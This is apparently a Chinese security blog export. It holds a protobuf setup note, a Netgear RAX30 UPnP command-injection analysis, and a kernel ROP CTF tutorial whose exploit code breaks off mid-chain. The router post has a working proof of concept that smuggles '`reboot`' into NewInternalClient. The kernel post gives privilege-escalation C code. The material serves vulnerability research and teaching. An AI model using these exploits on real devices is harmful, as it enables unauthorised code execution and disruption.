<h2 id="安装protobuf"><a href="#安装protobuf" class="headerlink" title="安装protobuf"></a>安装protobuf</h2><p>下载：<a href="https://github.com/protocolbuffers/protobuf/releases">https://github.com/protocolbuffers/protobuf/releases</a></p>
<p>根据其readme.txt安装即可</p>
<p>报错：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ protoc --c_out=./heapProto.h ./heap.proto</span><br><span class="line">protoc-gen-c: program not found or is not executable</span><br><span class="line">Please specify a program using absolute path or make sure the program is available in your PATH system variable</span><br><span class="line">--c_out: protoc-gen-c: Plugin failed with status code 1.</span><br></pre></td></tr></table></figure>

<p>缺少依赖</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install protobuf-c-compiler</span><br></pre></td></tr></table></figure>

<h2 id="安装pbkt"><a href="#安装pbkt" class="headerlink" title="安装pbkt"></a>安装pbkt</h2><p>下载：<a href="https://github.com/marin-m/pbtk">https://github.com/marin-m/pbtk</a></p>
<p>其readme有点搞，可能是因为版本太久没更新的缘故，apt安装需要更换为以下：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip git openjdk-11-jre libqt5x11extras5 python3-pyqt5.qtwebengine python3-pyqt5</span><br><span class="line">sudo pip3 install protobuf pyqt5 pyqtwebengine requests websocket-client</span><br><span class="line">git clone https://github.com/marin-m/pbtk</span><br><span class="line">cd pbtk</span><br><span class="line">./gui.py</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>Netgear RAX30 固件分析</title>
    <url>/posts/a9bcbbe9.html</url>
    <content><![CDATA[<h2 id="分析对象"><a href="#分析对象" class="headerlink" title="分析对象"></a>分析对象</h2><ul>
<li>型号：Netgear RAX30</li>
<li>固件版本：1.0.9.92</li>
</ul>
<h2 id="CVE-2023-35722-分析"><a href="#CVE-2023-35722-分析" class="headerlink" title="CVE-2023-35722 分析"></a>CVE-2023-35722 分析</h2><blockquote>
<p>该漏洞允许网络邻近的攻击者在受影响的NETGEAR RAX30路由器上执行任意代码。利用此漏洞不需要身份验证。具体漏洞存在于UPnP端口映射请求的处理中。问题在于在使用用户提供的字符串执行系统调用之前，缺乏对其进行适当验证。攻击者可以利用此漏洞以root的身份执行代码。漏洞编号为ZDI-CAN-20429。</p>
</blockquote>
<p>因为该漏洞影响版本为<strong>Up to (excluding) 1.0.11.96_2_hotfix</strong>。可以发现供应商发布了hotfix进行紧急修复，因此可以对照1.0.11.96_2_hotfix和比较接近的1.0.10.94_3两个版本进行diff。</p>
<p>选择upnp程序进行diff</p>
<img src="/posts/a9bcbbe9/upload_5053ef8c7f4d71782822be6c6fbd21c2.png" class="">


<p>发现有一个函数相似度较低，分析该函数：</p>
<img src="/posts/a9bcbbe9/upload_1f1783fe283679ad5cd831ae0097b3d5.png" class="">


<p>主要的改动为在开头接受upnp_updateOrAddPortMapping_dev2参数内容时添加了正则表达式匹配逻辑，检测a8,a9参数是否合法，因此怀疑漏洞为a8,a9参数内容为用户可控。</p>
<p>回溯上层调用，为v6变量</p>
<img src="/posts/a9bcbbe9/upload_9439d4a4fd202c3d6b3b8ed2db92e23c.png" class="">


<p>继续上溯，发现为结构体，应该为函数表，该函数对应<code>AddPortMapping</code>功能</p>
<img src="/posts/a9bcbbe9/image-20250521174824025.png" class="" title="image-20250521174824025">

<p>以上结构体格式如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">AddPortMapping</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* func_name;</span><br><span class="line">    INT32 func_ptr;</span><br><span class="line">    func_arg* args_list;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">func_arg</span> &#123;</span></span><br><span class="line">    <span class="type">char</span>* arg_name;</span><br><span class="line">    <span class="type">char</span> arg_idx[<span class="number">0xc</span>];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sink点分析"><a href="#sink点分析" class="headerlink" title="sink点分析"></a>sink点分析</h3><p>应该是<code>libcms_core.so</code>文件的<code>rutIpt_portforwardRunIptables</code>函数（感觉这个更有可能一些）<br>sink点函数调用链：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">rcl_dev2IpInterfaceObject</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">   ...</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">rutIpt_initNat</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">rutIpt_activatePortMappingEntries_dev2</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">rutIpt_portforwardCfg_dev2</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">rutIpt_portforwardRunIptables</span><br><span class="line">    |</span><br><span class="line">    V</span><br><span class="line">rut_doSystemAction</span><br></pre></td></tr></table></figure>
<img src="/posts/a9bcbbe9/upload_bb3bb082eff66fc5f4d68a30837f78df.png" class="">

<p>doSystemAction函数内容如下，可以看到是会执行a2参数命令。</p>
<img src="/posts/a9bcbbe9/upload_d8d2d7a362d85a5faa16f50e1bf17785.png" class="">

<h2 id="exp编写"><a href="#exp编写" class="headerlink" title="exp编写"></a>exp编写</h2><p>编写upnp交互程序，修改其InternelClient参数内容为注入命令。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#! /usr/bin/env python</span></span><br><span class="line"><span class="comment"># $Id: testupnpigd.py,v 1.7 2020/04/06 10:23:02 nanard Exp $</span></span><br><span class="line"><span class="comment"># MiniUPnP project</span></span><br><span class="line"><span class="comment"># Author : Thomas Bernard</span></span><br><span class="line"><span class="comment"># This Sample code is public domain.</span></span><br><span class="line"><span class="comment"># website : https://miniupnp.tuxfamily.org/</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># import the python miniupnpc module</span></span><br><span class="line"><span class="keyword">import</span> miniupnpc</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">from</span> http.server <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"><span class="keyword">except</span> ImportError:</span><br><span class="line">    <span class="keyword">from</span> BaseHTTPServer <span class="keyword">import</span> BaseHTTPRequestHandler, HTTPServer</span><br><span class="line"></span><br><span class="line"><span class="comment"># function definition</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_redirections</span>():</span><br><span class="line">	i = <span class="number">0</span></span><br><span class="line">	<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">		p = u.getgenericportmapping(i)</span><br><span class="line">		<span class="keyword">if</span> p==<span class="literal">None</span>:</span><br><span class="line">			<span class="keyword">break</span></span><br><span class="line">		<span class="built_in">print</span>(i, p)</span><br><span class="line">		i = i + <span class="number">1</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># create the object</span></span><br><span class="line">u = miniupnpc.UPnP()</span><br><span class="line"><span class="comment">#print &#x27;inital(default) values :&#x27;</span></span><br><span class="line"><span class="comment">#print &#x27; discoverdelay&#x27;, u.discoverdelay</span></span><br><span class="line"><span class="comment">#print &#x27; lanaddr&#x27;, u.lanaddr</span></span><br><span class="line"><span class="comment">#print &#x27; multicastif&#x27;, u.multicastif</span></span><br><span class="line"><span class="comment">#print &#x27; minissdpdsocket&#x27;, u.minissdpdsocket</span></span><br><span class="line">u.discoverdelay = <span class="number">200</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Discovering... delay=%ums&#x27;</span> % u.discoverdelay)</span><br><span class="line">	ndevices = u.discover()</span><br><span class="line">	<span class="built_in">print</span>(ndevices, <span class="string">&#x27;device(s) detected&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="comment"># select an igd</span></span><br><span class="line">	u.selectigd()</span><br><span class="line">	<span class="comment"># display information about the IGD and the internet connection</span></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;local ip address :&#x27;</span>, u.lanaddr)</span><br><span class="line">	externalipaddress = u.externalipaddress()</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;external ip address :&#x27;</span>, externalipaddress)</span><br><span class="line">	<span class="built_in">print</span>(u.statusinfo(), u.connectiontype())</span><br><span class="line"></span><br><span class="line">	<span class="comment"># find a free port for the redirection</span></span><br><span class="line">	r = u.getspecificportmapping(<span class="number">11111</span>, <span class="string">&#x27;TCP&#x27;</span>)</span><br><span class="line">	eport = <span class="number">11111</span></span><br><span class="line">	<span class="keyword">while</span> r != <span class="literal">None</span> <span class="keyword">and</span> eport &lt; <span class="number">65536</span>:</span><br><span class="line">		eport = eport + <span class="number">1</span></span><br><span class="line">		r = u.getspecificportmapping(eport, <span class="string">&#x27;TCP&#x27;</span>)</span><br><span class="line"></span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;trying to redirect %s port %u TCP =&gt; %s port %u TCP&#x27;</span> % (externalipaddress, eport, u.lanaddr, <span class="number">11111</span>))</span><br><span class="line"></span><br><span class="line">	b = u.addportmapping(eport, <span class="string">&#x27;TCP&#x27;</span>, <span class="string">&#x27;`reboot`&#x27;</span>, <span class="number">11111</span>,</span><br><span class="line">	                    <span class="string">&#x27;UPnP IGD Tester port %u&#x27;</span> % eport, <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="keyword">if</span> b:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;Success. Now waiting for some HTTP request on http://%s:%u&#x27;</span> % (externalipaddress ,eport))</span><br><span class="line">		<span class="comment"># b = u.deleteportmapping(eport, &#x27;TCP&#x27;)</span></span><br><span class="line">		<span class="comment"># if b:</span></span><br><span class="line">		<span class="comment"># 	print(&#x27;Successfully deleted port mapping&#x27;)</span></span><br><span class="line">		<span class="comment"># else:</span></span><br><span class="line">		<span class="comment"># 	print(&#x27;Failed to remove port mapping&#x27;)</span></span><br><span class="line">	<span class="keyword">else</span>:</span><br><span class="line">		<span class="built_in">print</span>(<span class="string">&#x27;Failed&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">	<span class="built_in">print</span>(<span class="string">&#x27;Exception :&#x27;</span>, e)</span><br></pre></td></tr></table></figure>
<p>尝试telnetd、ping等命令无效，使用reboot命令，成功使设备重启。<br>不过发现命令注入参数为”NewInternalClient”。<br>使用修复后的尝试：</p>
<img src="/posts/a9bcbbe9/upload_79fafa157e08258075b185ddb5801863.png" class="">



<h2 id="漏洞挖掘"><a href="#漏洞挖掘" class="headerlink" title="漏洞挖掘"></a>漏洞挖掘</h2><p>下载最新固件：<a href="https://www.netgear.com/support/product/rax30/#download">Netgear RAX30-V1.0.14.108_1</a></p>
<h3 id="反汇编恢复符号"><a href="#反汇编恢复符号" class="headerlink" title="反汇编恢复符号"></a>反汇编恢复符号</h3><p>静态分析发现其中很多函数都存在调试信息，因此可以考虑使用ida脚本自动化恢复。</p>


]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
  </entry>
  <entry>
    <title>Kernel ROP入门学习</title>
    <url>/posts/8981f97e.html</url>
    <content><![CDATA[<p>参考链接：<a href="https://arttnba3.cn/2021/03/03/PWN-0X00-LINUX-KERNEL-PWN-PART-I/#0x03-Kernel-ROP-ret2dir">a3大佬</a></p>
<h2 id="01-Kernel-ROP-basic"><a href="#01-Kernel-ROP-basic" class="headerlink" title="01. Kernel ROP - basic"></a>01. Kernel ROP - basic</h2><p>所需要构造执行的ROPchain为<code>commit_creds(prepare_kernel_cerd(&amp;init_task))</code>或<code>commit_creds(&amp;init_cred)</code>（这个似乎更方便，要去找对应内核的源码，然后用ida打开vmlinux查看其对应位置）<br>当成功执行如上函数之后，当前线程的cred结构体便会变为init进程的cred的拷贝，也就获得了root权限，此时在用户态起一个shell便能获得root shell。</p>
<blockquote>
<p>旧版本内核上所用的提权方法<code>commit_creds(prepare_kernel_cred(NULL))</code>已经不再能被使用，在高版本的内核当中<code>prepare_kernel_cred(NULL)</code>将不再返回一个root cred。</p>
</blockquote>
<h3 id="状态保存"><a href="#状态保存" class="headerlink" title="状态保存"></a>状态保存</h3><p>exploit需要进入到内核当中完成提权，而我们最终仍然需要着陆回到用户态来获取一个root权限的shell，因此在进入内核态之前我们需要手动模拟用户态进入内核态的准备工作——保存各寄存器的值到内核栈上。<br>通常使用如下函数保存各寄存器值到我们自己定义的变量中，以便于构造rop链：</p>
<blockquote>
<p>通用的pwn板子<br>使用内联汇编，编译时需要指定参数：<code>-masm=intel</code></p>
</blockquote>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="返回用户态"><a href="#返回用户态" class="headerlink" title="返回用户态"></a>返回用户态</h3><p><a href="https://arttnba3.cn/2021/02/21/OS-0X00-LINUX-KERNEL-PART-I/">内核态返回用户态的过程</a></p>
<ul>
<li>swapgs指令恢复用户态GS寄存器</li>
<li>sysretq或者iretq恢复到用户空间<br>只需要在内核中找到相应的gadget并执行swapgs;iretq即可返回用户态<br>一般来说，构造返回用户态ROP链如下：<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">swapgs</span><br><span class="line">iretq</span><br><span class="line">user_shell_addr</span><br><span class="line">user_cs</span><br><span class="line">user_eflags		// 64bit user_rflags</span><br><span class="line">user_sp</span><br><span class="line">user_ss</span><br></pre></td></tr></table></figure></li>
</ul>
<h3 id="例题：强网杯2018-core"><a href="#例题：强网杯2018-core" class="headerlink" title="例题：强网杯2018 - core"></a>例题：强网杯2018 - core</h3><p>查看<code>start.sh</code>，开启了kaslr防护：</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">qemu-system-x86_64 \</span><br><span class="line">-m 64M \</span><br><span class="line">-kernel ./bzImage \</span><br><span class="line">-initrd  ./core.cpio \</span><br><span class="line">-append &quot;root=/dev/ram rw console=ttyS0 oops=panic panic=1 quiet kaslr&quot; \</span><br><span class="line">-s  \</span><br><span class="line">-netdev user,id=t0, -device e1000,netdev=t0,id=nic0 \</span><br><span class="line">-nographic  \</span><br></pre></td></tr></table></figure>
<p>解压文件系统，查看<code>init</code>文件</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">cpio -idmv &lt; ../core.cpio.gz</span><br></pre></td></tr></table></figure>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta prompt_">#</span><span class="language-bash">!/bin/sh</span></span><br><span class="line">mount -t proc proc /proc</span><br><span class="line">mount -t sysfs sysfs /sys</span><br><span class="line">mount -t devtmpfs none /dev</span><br><span class="line">/sbin/mdev -s</span><br><span class="line">mkdir -p /dev/pts</span><br><span class="line">mount -vt devpts -o gid=4,mode=620 none /dev/pts</span><br><span class="line">chmod 666 /dev/ptmx</span><br><span class="line">cat /proc/kallsyms &gt; /tmp/kallsyms</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/kptr_restrict</span><br><span class="line">echo 1 &gt; /proc/sys/kernel/dmesg_restrict</span><br><span class="line">ifconfig eth0 up</span><br><span class="line">udhcpc -i eth0</span><br><span class="line">ifconfig eth0 10.0.2.15 netmask 255.255.255.0</span><br><span class="line">route add default gw 10.0.2.2</span><br><span class="line">insmod /core.ko</span><br><span class="line"></span><br><span class="line">poweroff -d 120 -f &amp; # 定时关机</span><br><span class="line">setsid /bin/cttyhack setuidgid 1000 /bin/sh</span><br><span class="line">echo &#x27;sh end!\n&#x27;</span><br><span class="line">umount /proc</span><br><span class="line">umount /sys</span><br><span class="line"></span><br><span class="line">poweroff -d 0  -f # 定时关机</span><br></pre></td></tr></table></figure>
<p>其中将&#x2F;proc&#x2F;kallsysms符号表内容复制到tmp目录下，因此可以访问其符号地址</p>
<h4 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h4><p>checksec一下，开启了NX和canary</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">❯ checksec --file=core.ko</span><br><span class="line">[*] &#x27;/mnt/d/Bronya/Brownie/CTF/practice/0ops内训/kernel/qwb_2018_core/core/rootfs/core.ko&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      No RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        No PIE (0x0)</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure>
<p>使用ida反汇编<br><code>init_module</code>函数初始化了一个设备<code>/proc/core</code>，<code>core_fops</code>结构体定义了<code>write</code>, <code>ioctl</code>, <code>release</code>三个操作：</p>
<img src="/posts/8981f97e/image-20250602120843207.png" class="" title="image-20250602120843207">
<p><code>core_write</code>函数，可以向bss段写入长度为0x800的数据：</p>
<img src="/posts/8981f97e/image-20250602121340689.png" class="" title="image-20250602121340689">
<p><code>core_ioctl</code>函数定义了三种功能，core_read读取栈空间内容；修改off变量值；</p>
<img src="/posts/8981f97e/image-20250602121508106.png" class="" title="image-20250602121508106">
<p><code>core_read</code>函数将栈上数据拷贝给a1，也就用户态：</p>
<img src="/posts/8981f97e/image-20250602120951140.png" class="" title="image-20250602120951140">
<p><code>core_copy_func</code>函数复制name内指定长度内容到栈上，由于此处qmemcpy时长度使用了强制类型转换，可以发现存在整数溢出，可以设置int64类型下为负值，但int16下为大于63的值：</p>
<img src="/posts/8981f97e/image-20250602121605188.png" class="" title="image-20250602121605188">
<h4 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h4><p>利用栈溢出在栈上构造ROP chain来提权<br>只要可以在内核空间执行<code>commit_cred(prepare_kernel_cred(NULL))</code>，即可将进程权限提升至root<br>调试时可以先把kaslr关掉，获取没有偏移的函数地址，后续再通过该值计算偏移。</p>
<img src="/posts/8981f97e/image-20250602125010382.png" class="" title="image-20250602125010382">
<p>构造exp如下：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SUCCESS_MSG(msg)    <span class="string">&quot;\033[32m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INFO_MSG(msg)       <span class="string">&quot;\033[34m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ERROR_MSG(msg)      <span class="string">&quot;\033[31m\033[1m&quot;</span> msg <span class="string">&quot;\033[0m&quot;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_success(msg)    puts(SUCCESS_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_info(msg)       puts(INFO_MSG(msg))</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> log_error(msg)      puts(ERROR_MSG(msg))</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// define symbols variables</span></span><br><span class="line"><span class="type">size_t</span> commit_creds = <span class="number">0</span>; prepare_kernel_cred = <span class="number">0</span>;</span><br><span class="line"><span class="type">size_t</span> kernel_base = <span class="number">0xffffffff81000000</span>, kernel_offset;</span><br><span class="line"></span><br><span class="line"><span class="comment">// enter kernel func: save status </span></span><br><span class="line"><span class="type">size_t</span> user_cs, user_ss, user_rflags, user_sp;</span><br><span class="line"><span class="type">void</span> <span class="title function_">save_status</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">asm</span> <span class="title function_">volatile</span> <span class="params">(</span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_cs, cs;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_ss, ss;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;mov user_sp, rsp;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pushf;&quot;</span></span></span><br><span class="line"><span class="params">        <span class="string">&quot;pop user_rflags;&quot;</span></span></span><br><span class="line"><span class="params">    )</span>;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;\033[34m\033[1m[*] Status has been saved.\033[0m&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">get_root_shell</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">if</span>(getuid()) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] Failed to get the root!&quot;</span>);</span><br><span class="line">        sleep(<span class="number">5</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line">    log_success(<span class="string">&quot;[+] Successful to get the root.&quot;</span>);</span><br><span class="line">    log_info(<span class="string">&quot;[*] Execve root shell now...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// to exit normally, instead of potential segmentation fault</span></span><br><span class="line">    <span class="built_in">exit</span>(EXIT_SUCCESS);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// interact with /proc/core</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_read</span><span class="params">(<span class="type">int</span> fd, <span class="type">char</span> *buf)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889b</span>, buf);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">set_off_val</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> off)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889c</span>, off);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">core_copy</span><span class="params">(<span class="type">int</span> fd, <span class="type">size_t</span> len)</span></span><br><span class="line">&#123;</span><br><span class="line">    ioctl(fd, <span class="number">0x6677889d</span>, len);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// exploition</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> COMMIT_CREDS            0xffffffff9909c8e0</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDI_RET             0xffffffff81000b2f</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MOV_RDI_RAX_CALL_RDX    0xffffffff8101aa6a</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RDX_RET             0xffffffff810a0f49</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> POP_RCX_RET             0xffffffff81021e53</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> SWAPGS_POPFQ_RET        0xffffffff81a012da</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRETQ                   0xffffffff81050ac2</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">exploition</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">    FILE *ksyms_file;</span><br><span class="line">    <span class="comment">// open device</span></span><br><span class="line">    <span class="type">int</span> fd;</span><br><span class="line">    <span class="type">char</span> buf[<span class="number">0x1000</span>], type[<span class="number">0x10</span>];</span><br><span class="line">    <span class="type">size_t</span> addr;</span><br><span class="line">    <span class="type">size_t</span> canary;</span><br><span class="line">    <span class="type">size_t</span> rop_chain[<span class="number">0x100</span>], i;</span><br><span class="line">    </span><br><span class="line">    log_info(<span class="string">&quot;[*] Start to exploit...&quot;</span>);</span><br><span class="line">    save_status();</span><br><span class="line"></span><br><span class="line">    fd = open(<span class="string">&quot;/proc/core&quot;</span>, O_RDWR);</span><br><span class="line">    <span class="keyword">if</span> (fd &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] open device error!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// get addresses of kernel symbols</span></span><br><span class="line">    log_info(<span class="string">&quot;[*] Reading /tmp/kallsyms...&quot;</span>);</span><br><span class="line">    ksyms_file = fopen(<span class="string">&quot;/tmp/kallsyms&quot;</span>, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (ksyms_file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        log_error(<span class="string">&quot;[x] Failed to open the sym_table file!&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span>(<span class="built_in">fscanf</span>(ksyms_file, <span class="string">&quot;%lx%s%s&quot;</span>, &amp;addr, type, buf)) &#123;</span><br><span class="line">        <span class="keyword">if</span> (prepare_kernel_cred &amp;&amp; commit_creds) &#123;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (!commit_creds &amp;&amp; !<span class="built_in">strcmp</span>(buf, <span class="string">&quot;commit_creds&quot;</span>)) &#123;</span><br><span class="line">            commit_creds = addr;</span><br><span class="line">            <span class="built_in">printf</span>(</span><br><span class="line">                SUCCESS_MSG(<span class="string">&quot;[+] Successful to get the addr of commit_creds: &quot;</span>)</span><br><span class="line">                <span class="string">&quot;%lx\n&quot;</span>, commit_creds);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!<span class="built_in">strcmp</span>(buf, <span class="string">&quot;prepare_kernel_cred&quot;</span>)) &#123;</span><br><span class="line">            prepare_kernel_cred = addr;</span><br><span class="line">            <span class="built_in">printf</span>(SUCCESS_MSG(</span><br><span class="line">                <span class="string">&quot;[+] Successful to get the addr of prepare_kernel_cred&quot;</span>)</span><br><span class="line">                <span class="string">&quot;%lx\n&quot;</span>, prepare_kernel_cred);</span><br><span class="line">            <span class="keyword">continue</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    kernel_offset = commit_creds - COMMIT_CREDS;</span><br><span class="line">    kernel_base += kernel_offset;</span><br><span class="line">    <span class="built_in">printf</span>(</span><br><span class="line">        SUCCESS_MSG(<span class="string">&quot;[+] Got kernel base: &quot;</span>) <span class="string">&quot;%lx&quot;</span></span><br><span class="line">        SUCCESS_MSG(<span class="string">&quot; , kaslr offset: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>,</span><br><span class="line">        kernel_base,</span><br><span class="line">        kernel_offset</span><br><span class="line">    );</span><br><span class="line"></span><br><span class="line">    <span class="comment">// leak canary</span></span><br><span class="line">    log_info(<span class="string">&quot;[*] Reading value of kernel stack canary...&quot;</span>);</span><br><span class="line"></span><br><span class="line">    set_off_val(fd, <span class="number">64</span>);</span><br><span class="line">    core_read(fd, buf);</span><br><span class="line">    canary = ((<span class="type">size_t</span>*) buf[<span class="number">0</span>]);</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(SUCCESS_MSG(<span class="string">&quot;[+] Got kernel stack canary: &quot;</span>) <span class="string">&quot;%lx\n&quot;</span>, canary);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// build rop chain</span></span><br><span class="line">    <span class="keyword">for</span> (i=<span class="number">0</span>; i&lt;<span class="number">10</span>; i++) &#123;</span><br><span class="line">        rop_chain[i] = canary;</span><br><span class="line">    &#125;</span><br><span class="line">    rop_chain[i++] = POP_RDI_RET+kernel_offset;</span><br><span class="line">    rop_chain[i++] = <span class="number">0</span>;</span><br><span class="line">    rop_chain[i++] = prepare_kernel_cred;</span><br><span class="line">    rop_chain[i++] = POP_RDX_RET+kernel_offset;</span><br><span class="line">    rop_chain[i++] = POP_RCX_RET+kernel_offset;</span><br><span class="line">    rop_chain[i++] = 